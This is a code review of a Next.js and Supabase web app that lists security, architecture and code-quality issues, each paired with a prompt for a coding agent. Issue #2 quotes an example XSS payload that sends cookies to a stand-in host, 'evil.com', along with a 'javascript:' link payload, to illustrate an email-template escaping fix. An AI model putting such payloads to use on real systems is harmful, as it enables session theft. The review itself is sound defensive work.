# Comprehensive Code Review — `cromos-web`

> Reviewed: 2026-02-08 | Stack: Next.js 16, React 19, Supabase, Capacitor, Tailwind 4, Sentry

---

## 🔴 Critical — Security & Data Integrity

### 1. ~~No Next.js Middleware for Auth/Route Protection~~ ✅ RESOLVED
**Priority: P0 — CRITICAL**

> **Resolved 2026-02-09:** Created `src/lib/supabase/middleware.ts` and updated `src/proxy.ts` to refresh Supabase auth sessions on every request, redirect unauthenticated users on protected page routes to `/login`, and return 401 on `/api/admin/*` routes. Commit `560cfff`.

There is **no `middleware.ts`** anywhere in the project. All auth protection is done client-side via `AuthGuard` and `AdminGuard` components. This means:
- Admin API routes (`/api/admin/*`) are the only server-side protected endpoints, but they rely on cookie-based session checks that could be bypassed.
- Every page is fully client-rendered before deciding to redirect — exposing flickers of protected content.
- There is no central token-refresh mechanism on the server side.

**Summary fix:** Create a `src/middleware.ts` that refreshes Supabase auth tokens and protects `/admin/*`, `/api/admin/*`, `/profile/*`, `/chats/*`, and `/marketplace/*` routes.

> **Agent Prompt:**
>
> **Context:** This is a Next.js 16 app using Supabase for authentication. Currently, ALL route protection is done client-side via React components (`AuthGuard`, `AdminGuard`). This means every protected page is fully downloaded, rendered, and hydrated in the browser before the JS decides to redirect unauthenticated users to `/login`. This creates two problems: (1) a flash of protected content before the redirect, and (2) no server-side JWT token refresh — if a user's session token expires between requests, the client-side Supabase client must handle the refresh, which can fail and cause cascading auth bugs (which this codebase has already experienced, see conversation history about "redirect loops" and "auth recovery loops"). Next.js middleware runs on the Edge at the CDN level, BEFORE the page is rendered, making it the correct place to verify sessions and refresh tokens. Supabase's official Next.js docs specifically recommend this pattern because `getUser()` in middleware validates the JWT against the Supabase server on every request, keeping the session fresh.
>
> Create a new file `src/middleware.ts` following the Supabase SSR middleware pattern from the official docs. The middleware should:
> 1. Call `supabase.auth.getUser()` to refresh the session on every request
> 2. Redirect unauthenticated users visiting `/admin/*`, `/profile/*`, `/chats/*`, `/favorites/*`, `/mis-plantillas/*`, `/mi-coleccion/*` to `/login`
> 3. For `/api/admin/*` routes, return 401 if no valid session
> 4. Export a `config.matcher` that excludes static files, `_next`, and public routes (`/`, `/login`, `/signup`, `/forgot-password`, `/legal/*`, `/marketplace` listing pages, `/templates`)
> Reference the Supabase Next.js middleware docs at https://supabase.com/docs/guides/auth/server-side/nextjs

---

### 2. XSS Vulnerability in Edge Function Email Templates
**Priority: P0 — CRITICAL**

In [send-email-notification/index.ts](file:///c:/Users/dsalv/Projects/cromos-web/supabase/functions/send-email-notification/index.ts#L196-L198), user-controlled values `title`, `body`, and `data.action_url` are interpolated directly into HTML with no sanitization:

```typescript
<h2>${title}</h2>
<p>${body}</p>
${data?.action_url ? `<a href="${data.action_url}"...` : ''}
```

An attacker could inject malicious HTML/JS via a crafted notification payload.

**Summary fix:** HTML-escape all interpolated values before embedding in the email template.

> **Agent Prompt:**
>
> **Context:** The Supabase Edge Function `send-email-notification` receives a JSON payload with `title`, `body`, and `data.action_url` fields, then embeds them directly into an HTML email template using JavaScript template literals. These values originate from the application's notification system — for example, when a user sends a trade proposal, the title might be "Nueva propuesta de intercambio de {username}". The problem is that if ANY part of the system allows user-controlled text to flow into these fields (e.g., a username, a listing title, or a chat message excerpt), an attacker can craft a value like `<script>document.location='https://evil.com/?cookie='+document.cookie</script>` that gets injected into the HTML email. While most modern email clients strip `<script>` tags, they don't strip ALL HTML — an attacker could inject a convincing phishing form or a tracking pixel. The `action_url` field is even more dangerous: `javascript:alert('xss')` in an `href` executes in some email clients. The fix uses HTML entity escaping (the standard defense against XSS) and URL protocol validation (whitelist-only approach — only `https://` URLs are allowed, blocking `javascript:`, `data:`, and other dangerous protocols).
>
> In `supabase/functions/send-email-notification/index.ts`:
> 1. Add an `escapeHtml()` utility function at the top that escapes `&`, `<`, `>`, `"`, `'` characters
> 2. On lines 196-198, wrap `title`, `body`, and `data.action_url` with `escapeHtml()` before interpolation
> 3. For URLs specifically, also validate that `data.action_url` starts with `https://` to prevent `javascript:` protocol injection

---

### 3. Admin API Route Uses `getSession()` Instead of `getUser()`
**Priority: P0 — CRITICAL**

In [force-reset/route.ts](file:///c:/Users/dsalv/Projects/cromos-web/src/app/api/admin/force-reset/route.ts#L42-L44), admin verification uses `getSession()` which reads from local storage/cookies and **does not verify the JWT with the Supabase server**. The `delete-user` route correctly uses `getUser()`.

```typescript
// force-reset/route.ts — INSECURE
const { data: { session } } = await supabase.auth.getSession();

// delete-user/route.ts — CORRECT
const { data: { user } } = await supabase.auth.getUser();
```

**Summary fix:** Replace `getSession()` with `getUser()` in the force-reset route.

> **Agent Prompt:**
>
> **Context:** Supabase's `getSession()` reads the JWT from the cookie and decodes it locally — it does NOT verify the signature with the Supabase auth server. This means a tampered or expired JWT could pass the check. In a normal client-side context this is acceptable (the token will fail when actually calling the database), but in a server-side API route that performs privileged operations (generating a password reset link using the service-role key and sending it via email), this is a critical flaw. An attacker who crafts a valid-looking JWT with `is_admin: true` in the claims could potentially trigger a password reset for any user. The `getUser()` method, in contrast, makes a round-trip to the Supabase auth server to verify the JWT signature, confirming the user is who they claim to be. The `delete-user` route already uses this correct pattern — this is simply an inconsistency that needs to be fixed. The change is minimal — it's just swapping one method call and adjusting the destructured variable names.
>
> In `src/app/api/admin/force-reset/route.ts`:
> 1. Line 42-44: Replace `await supabase.auth.getSession()` with `await supabase.auth.getUser()`
> 2. Update the destructuring from `const { data: { session } }` to `const { data: { user }, error: userError }`
> 3. Line 46: Change `if (!session)` to `if (userError || !user)`
> 4. Line 54: Change `session.user.id` to `user.id`
> 5. Line 144: Change `session.user.id` to `user.id`
> This ensures the JWT is verified server-side, not just read from cookies.

---

### 4. Non-Atomic Multi-Table Client-Side Deletions
**Priority: P1 — HIGH**

In [ProfilePage.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/ProfilePage.tsx#L280-L327), the `removeCollection` function performs 3 sequential Supabase calls (fetch sticker IDs → delete user_stickers → delete user_collections) without a transaction. If any intermediate step fails, the data is left in an inconsistent state.

**Summary fix:** Replace with a single server-side RPC/database function that wraps all deletions in a transaction.

> **Agent Prompt:**
>
> **Context:** When a user removes a collection from their profile, the current code runs 3 separate Supabase client calls: (1) fetch all sticker IDs for the collection, (2) delete the user's `user_stickers` entries for those stickers, (3) delete the `user_collections` entry. Each call is a separate HTTP request to Supabase, and there is no transactional wrapper. If step 2 succeeds but step 3 fails (e.g., due to a network error, a RLS policy issue, or a timeout), the user's sticker data is deleted but the collection still appears in their profile — orphaned state that can't be easily recovered. The user would see the collection but with 0 stickers, and re-adding stickers wouldn't work because the underlying data is gone. The fix is to move this logic into a PostgreSQL function (RPC), because Supabase RPCs automatically execute within a single database transaction. If any statement within the function fails, the entire operation rolls back, guaranteeing data consistency. This is a well-established pattern — business-critical multi-table operations should always be server-side transactions, not client-side sequential calls.
>
> 1. Create a new Supabase migration that adds an RPC `remove_user_collection(p_user_id UUID, p_collection_id INT)` which:
>    - Deletes from `user_stickers` where `user_id = p_user_id` and `sticker_id` IN (SELECT id FROM stickers WHERE collection_id = p_collection_id)
>    - Deletes from `user_collections` where `user_id = p_user_id` AND `collection_id = p_collection_id`
>    - All inside a single transaction (the RPC body automatically runs in a transaction)
> 2. In `src/components/ProfilePage.tsx`, replace the `removeCollection` function (lines 280-327) with a single `supabase.rpc('remove_user_collection', { p_user_id: user.id, p_collection_id: collectionId })` call

---

## 🟠 High — Architecture & Performance

### 5. Manually-Defined Database Types (Not Auto-Generated)
**Priority: P1 — HIGH**

[src/types/index.ts](file:///c:/Users/dsalv/Projects/cromos-web/src/types/index.ts) contains a **hand-written** `Database` interface with only 6 tables and 1 deprecated function, while the actual database has many more tables (`collection_templates`, `template_copies`, `template_pages`, `template_slots`, `listings`, `chats`, `audit_log`, `notification_preferences`, etc.). This means:
- No type-safety for most Supabase queries
- All the `@ts-ignore` suppressions (24+ files) are likely caused by this
- Types drift from the actual schema

**Summary fix:** Auto-generate types using `supabase gen types typescript` and replace the manual types.

> **Agent Prompt:**
>
> **Context:** Supabase provides a CLI command (`supabase gen types typescript`) that introspects the live database schema and generates a complete TypeScript `Database` type containing every table, view, function, and enum. This project has a manually written `Database` interface in `src/types/index.ts` that only covers 6 of what appears to be 30+ tables. The consequence is severe: every Supabase query against a table not in the manual type definition gives `any` return types, which means TypeScript can't catch bugs like misspelled column names, wrong filter values, or mismatched types. This is why there are 24+ `@ts-ignore` comments across the codebase — developers had to suppress errors because TypeScript didn't know the shape of the data. Auto-generating types is the industry-standard approach for Supabase projects. The generated file replaces the manual one and is re-generated whenever the schema changes (via the existing `npm run generate-types` script, which already has this wired up but seemingly fell out of use). Passing the generic `Database` type to `createBrowserClient<Database>(...)` enables full end-to-end type inference on every `.from('table').select(...)` call.
>
> 1. Run `npx supabase gen types typescript --project-id <PROJECT_ID> > src/types/database.ts` (get the project ID from `supabase/config.toml` or `.env.local`)
> 2. Update `src/types/index.ts` to re-export from `database.ts` instead of manually defining the `Database` interface
> 3. Update `src/lib/supabase/client.ts` to use the generated `Database` type: `createBrowserClient<Database>(...)`
> 4. Remove all `@ts-ignore` comments in hooks that were needed because of missing type definitions (search for `@ts-ignore` across `src/hooks/` and `src/components/`)
> 5. Run `npm run type-check` to find and fix any remaining type errors

---

### 6. Deprecated RPC Still in Use (`get_user_collection_stats`)
**Priority: P1 — HIGH**

The deprecated `get_user_collection_stats` RPC is still called in [ProfilePage.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/ProfilePage.tsx#L166-L172) despite having TODO comments saying it was removed in v1.6.0. The type definition in `src/types/index.ts` also still references it.

**Summary fix:** Replace with the v1.6.0 equivalent RPCs as documented in the TODO comments.

> **Agent Prompt:**
>
> **Context:** The project underwent a major architectural pivot in v1.6.0 from a "collections" model (where collections were global and users joined them) to a "templates" model (where users create personal copies of collection templates). The old `get_user_collection_stats` RPC was designed for the original model — it takes a `p_collection_id` and returns aggregate stats. This RPC was removed from the database in v1.6.0, but the frontend code that calls it was never updated. Right now, this call either silently fails (returning null/empty, which the `normalizeCollectionStats` function handles gracefully) or throws an error that gets caught. Either way, users see 0/0 stats for their collections on the profile page. The TODO comments in the code reference `docs/RPC_MIGRATION_GUIDE_v1.5_to_v1.6.md` which documents the replacement RPCs. The fix is to follow that migration guide and replace the old call with the v1.6.0 equivalents that work with the template-based model.
>
> 1. In `src/components/ProfilePage.tsx`, lines 162-172: Replace the `supabase.rpc('get_user_collection_stats', ...)` call with the v1.6.0 replacement. Check `docs/RPC_MIGRATION_GUIDE_v1.5_to_v1.6.md` for the exact replacement RPCs (`get_my_template_copies` or `get_template_progress`)
> 2. In `src/types/index.ts`, lines 183-208: Remove the deprecated `get_user_collection_stats` function type
> 3. In `src/lib/collectionStats.ts`: Check if `normalizeCollectionStats` is still needed or can be simplified for the new RPC return format
> 4. Search the entire codebase for any other references to `get_user_collection_stats`

---

### 7. N+1 Query Pattern in ProfilePage
**Priority: P1 — HIGH**

In [ProfilePage.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/ProfilePage.tsx#L151-L190), `fetchProfileData` loops over each user collection and makes an individual RPC call for stats. If a user has 10 collections, this fires 10+ sequential Supabase calls.

**Summary fix:** Create a batch RPC or fetch all stats in a single query.

> **Agent Prompt:**
>
> **Context:** The N+1 query problem is a classic performance anti-pattern. In this case, the ProfilePage fetches the user's collections in one query (good), but then iterates over the results and fires a separate `supabase.rpc('get_user_collection_stats', { p_collection_id: id })` call for EACH collection inside a `Promise.all`. While `Promise.all` runs them concurrently (not sequentially), each call is still a separate HTTP request to Supabase, which means: N round trips × (~100-200ms each) = significant latency. With 5 collections, that's 500ms-1s of loading time just for stats. With 10, it's 1-2s. Each request also consumes a Supabase connection pool slot. The fix is to create a single PostgreSQL function that accepts a user ID and returns stats for ALL their collections in one query using JOINs and GROUP BY — this turns N+1 HTTP requests into exactly 1. This is especially relevant given issue #6 (the RPC is deprecated), meaning this should be part of the same migration to the v1.6.0 template-based approach, where `get_my_template_copies()` already returns all data in a single call.
>
> In `src/components/ProfilePage.tsx`, the `fetchProfileData` function (lines 100-221) has an N+1 query problem:
> - It fetches user collections, then loops with `Promise.all` calling `supabase.rpc('get_user_collection_stats')` individually for each collection
> - Create a new RPC `get_all_user_collection_stats(p_user_id UUID)` that returns stats for ALL collections at once
> - Or alternatively, since v1.6.0 migrated to templates, replace this entire page with the template-based approach using `get_my_template_copies()` which returns all data in one call
> - Update the component to use a single call and map the results to collections

---

### 8. Root `page.tsx` is a Client Component — No SSR/SEO for Landing Page
**Priority: P1 — HIGH**

[src/app/page.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/app/page.tsx#L1) has `'use client'` at the top. This means:
- The landing page (for unauthenticated users) is not server-rendered
- Search engines see an empty shell, severely hurting SEO
- The app shows a blank "Cargando..." screen while hydrating

**Summary fix:** Make the root page a Server Component that checks auth server-side and conditionally renders the landing page (SSR) or redirects to the dashboard.

> **Agent Prompt:**
>
> **Context:** The root `/` page is the most important page for SEO because it's what Google indexes, what social media previews show (Open Graph), and what new users see first. Currently, because of the `'use client'` directive, the server sends an empty HTML shell, then the browser downloads the JS bundle, hydrates React, runs `useUser()` to check auth, and ONLY THEN either shows the landing page or the dashboard. Google's crawler sees the empty shell and indexes essentially nothing — no headings, no content, no meta descriptions from the dynamic content. The fix is to make this a Server Component that checks the Supabase session server-side (using `createServerClient` from `@supabase/ssr` and cookies). If the user is authenticated, it redirects to `/dashboard` using Next.js's `redirect()`. If not, it renders the `LandingPage` component with full SSR — meaning the entire landing page HTML is sent in the initial response, which Google can index. The Capacitor/native logic needs to move to a separate small client component because `Capacitor.isNativePlatform()` requires the browser API, but this component can mount lazily and handle the native redirect without blocking the SSR path.
>
> Refactor `src/app/page.tsx`:
> 1. Remove `'use client'` directive
> 2. Make it an async Server Component
> 3. Use `createServerClient` from `@supabase/ssr` to check if the user is logged in server-side
> 4. If authenticated, use `redirect('/dashboard')` from `next/navigation` (or render server-side dashboard)
> 5. If not authenticated, render `<LandingPage />` as a server component or import it statically
> 6. Move the Capacitor/native platform checks to a separate client component `<NativeRedirectHandler />` that only mounts on native platforms
> 7. This enables full SSR/SEO for the landing page content

---

### 9. Duplicate Supabase Server Client Creation (Boilerplate)
**Priority: P2 — MEDIUM**

Both admin API routes [force-reset/route.ts](file:///c:/Users/dsalv/Projects/cromos-web/src/app/api/admin/force-reset/route.ts#L16-L41) and [delete-user/route.ts](file:///c:/Users/dsalv/Projects/cromos-web/src/app/api/admin/delete-user/route.ts#L15-L40) contain identical 25-line copy-pasted blocks for creating a Supabase server client with cookie handling.

**Summary fix:** Extract a shared `createSupabaseServerClient()` utility.

> **Agent Prompt:**
>
> **Context:** Both admin API routes independently set up a Supabase server client with manual cookie handling (get/set/remove methods wrapping Next.js `cookies()`). This 25-line block is identical in both files and is the standard boilerplate for Supabase SSR server clients in Next.js App Router. When this pattern is copy-pasted, bugs fixed in one file don't get fixed in the other (e.g., issue #3 where one route uses `getSession()` and the other uses `getUser()`). Additionally, any new API route would need to copy this block again. Extracting it into a shared utility (`src/lib/supabase/server.ts`) follows the DRY principle and creates a single place to configure the server client. This is exactly what Supabase's official Next.js quickstart guides recommend: a `server.ts` utility alongside the existing `client.ts`. The admin/service-role client is also extracted separately because it uses different credentials (the `SUPABASE_SERVICE_ROLE_KEY`) and should never have auto-refresh or session persistence.
>
> 1. Create `src/lib/supabase/server.ts` with a `createSupabaseServerClient()` function that handles the cookie boilerplate (lines 15-40 from `src/app/api/admin/delete-user/route.ts`)
> 2. Also add a `createSupabaseAdminClient()` function for service-role operations (lines 71-80)
> 3. Update `src/app/api/admin/force-reset/route.ts` and `src/app/api/admin/delete-user/route.ts` to use the shared utilities
> 4. Search for any other files that create server clients inline and update them too

---

## 🟡 Medium — Code Quality & Maintainability

### 10. Duplicate Type Definitions Across Components
**Priority: P2 — MEDIUM**

The `Collection`, `Profile`, `Sticker` interfaces are re-defined locally in multiple files instead of importing from a shared location:
- [ProfilePage.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/ProfilePage.tsx#L29-L61) — lines 29-61
- [CollectionPage.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/CollectionPage.tsx#L11-L55) — lines 11-55
- `src/types/index.ts` — the "canonical" definitions

**Summary fix:** Delete the local type definitions and import from `@/types`.

> **Agent Prompt:**
>
> **Context:** The same `Collection`, `Profile`, and `Sticker` interfaces are defined in at least 3 different places — `src/types/index.ts` (the canonical shared types), `ProfilePage.tsx` (lines 29-61), and `CollectionPage.tsx` (lines 11-55). These local copies have subtle differences: for example, the `Collection` type in `ProfilePage.tsx` has `description: string` (required) while `types/index.ts` has `description: string | null` (nullable). When a column changes in the database, developers update one definition but forget the others, creating silent type mismatches that TypeScript can't catch because each file uses its own local type. This is a direct consequence of the manual types (issue #5) — when auto-generated types are in place, there's only one source of truth and no reason to define local copies. The fix is to delete the local definitions and import from `@/types`. If the canonical types are missing fields that the component needs, add them to the shared types file rather than keeping local copies.
>
> 1. In `src/components/ProfilePage.tsx`, delete the `Collection` interface (lines 29-36), `UserCollection` interface (lines 38-48), `Profile` interface (lines 50-55), and `UserCollectionRawData` interface (lines 57-61)
> 2. Import the equivalent types from `@/types` at the top. If needed types don't exist in `@/types/index.ts`, add them there first
> 3. In `src/components/CollectionPage.tsx`, delete the `Collection` interface (lines 11-17), `Sticker` interface (lines 19-32), and related types (lines 34-54)
> 4. Import from `@/types` instead. Search for other components with local type definitions and consolidate them

---

### 11. Legacy/Dead Exports in SupabaseProvider
**Priority: P2 — MEDIUM**

[SupabaseProvider.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/providers/SupabaseProvider.tsx#L140-L163) exports `useSupabase()` and `useSession()` as "legacy exports for backward compatibility". The `useSession` hook returns a synthetic session object constructed from user, and `useSupabase` returns `session: null`.

**Summary fix:** Migrate all consumers to `useSupabaseClient()` and `useUser()`, then remove legacy exports.

> **Agent Prompt:**
>
> **Context:** The `SupabaseProvider` was refactored at some point to use a simpler architecture that stores `User` instead of `Session`. The old API (`useSupabase()` returning `{ supabase, user, session, loading }` and `useSession()` returning `{ session, loading }`) was kept for backward compatibility but the `session` value is now hardcoded to `null` in `useSupabase()` and synthetically constructed from the `user` object in `useSession()`. This creates confusion: components that import `useSupabase` get a `session: null` property that appears valid but is always null, which could cause silent bugs if anyone checks `session.access_token` or similar. Components that import `useSession` get a fake session wrapper. Meanwhile, the actual recommended hooks — `useSupabaseClient()` and `useUser()` — provide the correct, clean API. Keeping both sets of exports violates the "one way to do things" principle and wastes mental overhead on every new developer (or AI agent) reading the code. The migration is mechanical: find-and-replace imports.
>
> 1. Search for all imports of `useSupabase` across the codebase: `grep -rn "useSupabase" src/` (exclude `SupabaseProvider.tsx`)
> 2. For each file importing `useSupabase`, replace with `useSupabaseClient` for the client and `useUser` for user/loading
> 3. Search for all imports of `useSession` and replace with `useUser`
> 4. After all consumers are migrated, delete the `useSupabase()` function (lines 141-152) and `useSession()` function (lines 154-163) from `src/components/providers/SupabaseProvider.tsx`
> 5. Run `npm run type-check` to verify no broken imports

---

### 12. Redundant Admin Check in AdminGuard
**Priority: P2 — MEDIUM**

[AdminGuard.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/AdminGuard.tsx#L33-L39) makes a separate Supabase query for `is_admin` even though `ProfileCompletionProvider` already fetches `is_admin` and exposes it via `useProfileCompletion().isAdmin`. The SiteHeader already uses this pattern correctly.

**Summary fix:** Use `useProfileCompletion().isAdmin` instead of a separate query.

> **Agent Prompt:**
>
> **Context:** The `ProfileCompletionProvider` was specifically enhanced to fetch `is_admin` alongside the profile data (nickname, postcode, avatar_url) in a single query — the comment in the provider says "Now fetches ALL profile data in a SINGLE query... this removes the redundant admin check query from SiteHeader." The `SiteHeader` component was updated to use this provider, but the `AdminGuard` component was not updated at the same time. As a result, when an admin visits any admin page, TWO queries are fired to check admin status: one from the `ProfileCompletionProvider` (which caches the result) and one from the `AdminGuard`'s own `useEffect`. The `AdminGuard` also re-checks suspension status, which the `SupabaseProvider` already does in the background. The fix eliminates the redundant query and simplifies the component from ~70 lines to ~30 by leveraging the data that's already available in the React context. This is a pure simplification — no behavior change, just removing the duplicate work.
>
> In `src/components/AdminGuard.tsx`:
> 1. Replace the `useSupabaseClient` import and the manual Supabase query (lines 18, 33-46) with `useProfileCompletion()` from `@/components/providers/ProfileCompletionProvider`
> 2. Use `const { isAdmin, loading: profileLoading } = useProfileCompletion()` instead of the local `isAdmin` state + `useEffect` with manual query
> 3. Remove the `useState` for `isAdmin` and `loading`, and the entire `useEffect` containing `checkAdminStatus`
> 4. The suspension check can be removed since `SupabaseProvider` already does this
> 5. Simplify the component to use the provider's already-fetched data

---

### 13. Encoding Corruption in Spanish Strings
**Priority: P2 — MEDIUM**

Several files contain corrupted Spanish characters (displayed as `�` instead of `ó`, `á`, etc.):
- [CollectionPage.tsx](file:///c:/Users/dsalv/Projects/cromos-web/src/components/CollectionPage.tsx#L159) — lines 159, 327, 387

**Summary fix:** Fix the encoding of the corrupted strings.

> **Agent Prompt:**
>
> **Context:** These corrupted characters are Unicode replacement characters (`U+FFFD`) — they appear when a file is saved with one encoding (likely Latin-1/ISO-8859-1) and read with another (UTF-8). The Spanish accented characters `ó` (in "colección") and `á` were lost and replaced with `�`. This is a visual bug that affects users seeing these strings in the UI. In `CollectionPage.tsx`, the loading state shows "Cargando tu colecci�n..." and the error state shows "No se encontr� una colecci�n activa." — both are user-facing strings with garbled characters. The fix is simply to re-type the correct Spanish strings. Ensure the file is saved as UTF-8 (which VSCode does by default).
>
> In `src/components/CollectionPage.tsx`:
> 1. Line 159: Replace `'No se encontr\uFFFD una colecci\uFFFDn activa.'` with `'No se encontró una colección activa.'`
> 2. Line 327: Replace `'Cargando tu colecci\uFFFDn...'` with `'Cargando tu colección...'`
> 3. Line 387: Replace `'Mi Colecci\uFFFDn'` with `'Mi Colección'`
> 4. Search the entire `src/` directory for other corrupted characters (regex: `\uFFFD` or `�`) and fix them

---

### 14. Locale Mismatch — Spanish App, English Dates
**Priority: P2 — MEDIUM**

[src/lib/utils.ts](file:///c:/Users/dsalv/Projects/cromos-web/src/lib/utils.ts#L18) uses `'en'` locale for `Intl.RelativeTimeFormat` and `'en-US'` for `toLocaleDateString`. The app is entirely in Spanish.

**Summary fix:** Change locale to `'es'` / `'es-ES'`.

> **Agent Prompt:**
>
> **Context:** The entire app UI is in Spanish — all labels, buttons, error messages, etc. use Spanish text. However, the date formatting utilities in `src/lib/utils.ts` use English locales: `Intl.RelativeTimeFormat('en')` produces "2 days ago" instead of "hace 2 días", and `toLocaleDateString('en-US')` produces "February 8, 2026" instead of "8 de febrero de 2026". When these utility functions are used in components (e.g., showing when a user joined, when a trade was proposed, when a listing was created), the dates appear in English within an otherwise fully Spanish interface. This creates a jarring mixed-language experience. The `Intl` APIs support Spanish natively — simply changing the locale string to `'es'` is all that's needed. No library changes or additional dependencies required.
>
> In `src/lib/utils.ts`:
> 1. Line 18: Change `new Intl.RelativeTimeFormat('en', { numeric: 'auto' })` to `new Intl.RelativeTimeFormat('es', { numeric: 'auto' })`
> 2. Line 42: Change `dateObj.toLocaleDateString('en-US', ...)` to `dateObj.toLocaleDateString('es-ES', ...)`
> 3. Search for other hardcoded `'en'` or `'en-US'` locale strings in `src/` and update them to `'es'` / `'es-ES'`

---

### 15. Dual ESLint Config Files
**Priority: P3 — LOW**

The project has both `.eslintrc.json` (flat config legacy) and `eslint.config.mjs` (new flat config format). The rules in `.eslintrc.json` (strict `no-unused-vars`, `no-explicit-any`, etc.) are **not** present in `eslint.config.mjs`, which only extends `next/core-web-vitals`. ESLint 9+ uses the flat config by default, so the stricter `.eslintrc.json` rules may be silently ignored.

**Summary fix:** Merge the `.eslintrc.json` rules into `eslint.config.mjs` and delete `.eslintrc.json`.

> **Agent Prompt:**
>
> **Context:** ESLint 9 (which this project uses) introduced a new "flat config" format (`eslint.config.mjs`). When this file exists, ESLint ignores the legacy `.eslintrc.json` file. The project has both: `.eslintrc.json` contains strict rules (`no-unused-vars: error`, `no-explicit-any: error`, `exhaustive-deps: error`), while `eslint.config.mjs` only extends `next/core-web-vitals` and `next/typescript` with no custom rules. This means the strict rules that the team intended to enforce are likely NOT being applied when `npm run lint` is executed — ESLint picks up the flat config and ignores the legacy config entirely. The fix is to port the custom rules from `.eslintrc.json` into the flat config format within `eslint.config.mjs`, then delete the legacy file to avoid confusion. The flat config format uses a different syntax (rules are in objects within an array), but the rule names and values are identical.
>
> 1. In `eslint.config.mjs`, add the rules from `.eslintrc.json` to the flat config:
>    - `'@typescript-eslint/no-unused-vars': 'error'`
>    - `'@typescript-eslint/no-explicit-any': 'error'`
>    - `'react-hooks/exhaustive-deps': 'error'`
>    - `'no-console': ['warn', { allow: ['warn', 'error'] }]`
>    - Add the logger override: `{ files: ['src/lib/logger.ts'], rules: { 'no-console': 'off' } }`
> 2. Delete `.eslintrc.json`
> 3. Run `npm run lint` to verify the rules are now applied correctly

---

### 16. 24+ Files with `@ts-ignore` Suppressions
**Priority: P2 — MEDIUM**

Found 24+ files using `@ts-ignore` to suppress TypeScript errors. This is almost entirely caused by the missing auto-generated database types (issue #5). Files include hooks across `admin/`, `marketplace/`, `trades/`, `templates/`, `social/`, and several components.

**Summary fix:** This is resolved by fixing issue #5 (auto-generating types). After that, remove all `@ts-ignore` comments.

> **Agent Prompt:**
>
> **Context:** `@ts-ignore` tells TypeScript "I know this line has a type error, ignore it." It's a blunt-force escape hatch that disables ALL type checking on the next line — including legitimate bugs. In this codebase, the `@ts-ignore` comments are almost universally applied to Supabase client calls (`.from('table').select(...)`, `.rpc('function_name', ...)`) because the hand-written `Database` type in `src/types/index.ts` only covers 6 of 30+ tables. When you query a table that TypeScript doesn't know about, it throws a type error, and the developer added `@ts-ignore` to make it compile. The problem is that once `@ts-ignore` is in place, TypeScript also can't catch REAL bugs on those lines — like passing a string where a number is expected, or misspelling a column name. This is a dependency of issue #5: once auto-generated types are in place, all these Supabase calls will have proper types, and the `@ts-ignore` comments can be removed. The underlying type errors will either be resolved (most cases) or reveal actual bugs that were previously hidden.
>
> After completing the auto-generated types task (issue #5), run this search to find all remaining `@ts-ignore` comments:
> ```
> grep -rn "@ts-ignore" src/
> ```
> For each file found, remove the `@ts-ignore` comment and fix the underlying type error using the newly generated types. Run `npm run type-check` after all fixes to verify.

---

### 17. Test/Debug Pages Deployed to Production
**Priority: P2 — MEDIUM**

Several test and debug pages exist in the `src/app/` directory that are presumably deployed:
- `src/app/page_test_auth.tsx`
- `src/app/test-error/`
- `src/app/test-marketplace/`
- `src/app/test-rls/`
- `src/app/debug/`
- `src/app/ui-demo/`
- `src/components/AuthTest.tsx`
- `src/components/SessionDebug.tsx`

**Summary fix:** Delete test/debug pages or gate them behind environment checks.

> **Agent Prompt:**
>
> **Context:** In Next.js App Router, every file inside `src/app/` that follows the routing convention automatically becomes a publicly accessible URL. These test/debug pages are likely accessible at `cambiocromos.com/test-error`, `cambiocromos.com/debug`, `cambiocromos.com/test-rls`, etc. This has two problems: (1) **Information disclosure** — debug pages often display internal state, environment info, or raw error details that help attackers understand the system. The `test-rls` page likely tests Row Level Security policies by showing what data is accessible, which directly reveals the security boundary. (2) **Attack surface** — each additional page is something that can be crawled, indexed, or probed. The `SessionDebug` component name suggests it exposes session/auth internals. The fix is simple: delete these files since they're development tools. If any are needed for ongoing debugging, gate them with `if (process.env.NODE_ENV === 'production') notFound()` at the top of the page component, which returns a 404 in production but works normally in development.
>
> 1. Delete the following files/directories that should not be in production:
>    - `src/app/page_test_auth.tsx`
>    - `src/app/test-error/` (entire directory)
>    - `src/app/test-marketplace/` (entire directory)
>    - `src/app/test-rls/` (entire directory)
>    - `src/app/debug/` (entire directory)
>    - `src/app/ui-demo/` (entire directory)
>    - `src/components/AuthTest.tsx`
>    - `src/components/SessionDebug.tsx`
> 2. If any of these are needed for development, add `if (process.env.NODE_ENV === 'production') notFound()` at the top of the page components instead
> 3. Search for imports of `AuthTest` or `SessionDebug` and remove them

---

### 18. Edge Functions Use Deprecated Deno Imports
**Priority: P2 — MEDIUM**

[send-email-notification/index.ts](file:///c:/Users/dsalv/Projects/cromos-web/supabase/functions/send-email-notification/index.ts#L6-L7) uses outdated import patterns:
```typescript
import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
```

Supabase Edge Functions now recommend using `Deno.serve()` and JSR imports.

**Summary fix:** Update to modern Deno patterns.

> **Agent Prompt:**
>
> **Context:** Supabase Edge Functions run on Deno, and the Deno ecosystem has undergone significant changes. The `serve()` function from `deno.land/std` is deprecated in favor of the built-in `Deno.serve()` which is faster (native implementation vs. JS wrapper) and simpler (no import needed). The `esm.sh` CDN is a third-party service that repackages npm modules for Deno — it's been replaced by JSR (JavaScript Registry), which is Deno's native package registry with better caching, versioning, and type support. The `std@0.168.0` pinned version is also nearly 3 years old. Using outdated imports means missing out on bug fixes, performance improvements, and potentially running into compatibility issues when Supabase upgrades their Edge Runtime. The migration is straightforward: `Deno.serve()` is a drop-in replacement for `serve()` with the same handler signature, and the JSR import syntax is just a URL format change.
>
> For all edge functions in `supabase/functions/*/index.ts`:
> 1. Replace `import { serve } from 'https://deno.land/std@0.168.0/http/server.ts'` with the modern `Deno.serve()` API
> 2. Replace `import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'` with `import { createClient } from 'jsr:@supabase/supabase-js@2'`
> 3. Change `serve(async (req) => { ... })` to `Deno.serve(async (req) => { ... })`
> 4. Add `import "jsr:@supabase/functions-js/edge-runtime.d.ts"` at the top for type definitions
